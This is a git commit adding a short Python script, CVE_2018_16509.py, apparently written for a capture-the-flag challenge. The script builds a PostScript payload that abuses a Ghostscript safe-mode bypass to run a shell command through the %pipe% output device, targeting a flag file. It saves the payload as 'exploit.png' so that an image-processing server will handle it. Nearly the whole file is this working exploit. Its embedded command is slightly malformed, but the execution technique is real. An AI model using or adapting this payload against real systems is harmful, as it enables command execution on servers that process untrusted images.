2fc37ad9803961820215f8413e7c247d9efdd953
AssassinUKG <more4money@gmail.com>
2021-06-08 11:28:44 +0100

    Add files via upload

---
+++ CVE_2018_16509.py
@@ -0,0 +1,23 @@
+
+# UPLOAD_FOLDER = '/app/application/static/petpets' of the vunerable application (example path)
+
+Path = "cat flag.txt >> /app/application/static/petpets/flag.txt"
+
+payload = r"""
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%touch {Path-01}) currentdevice putdeviceprops
+"""
+payload = payload.replace("{Path-01}", Path)
+
+with open("exploit.png", "w+") as r:
+    r.write(payload)
+    r.close()
+print(f"File created: {r.name}")
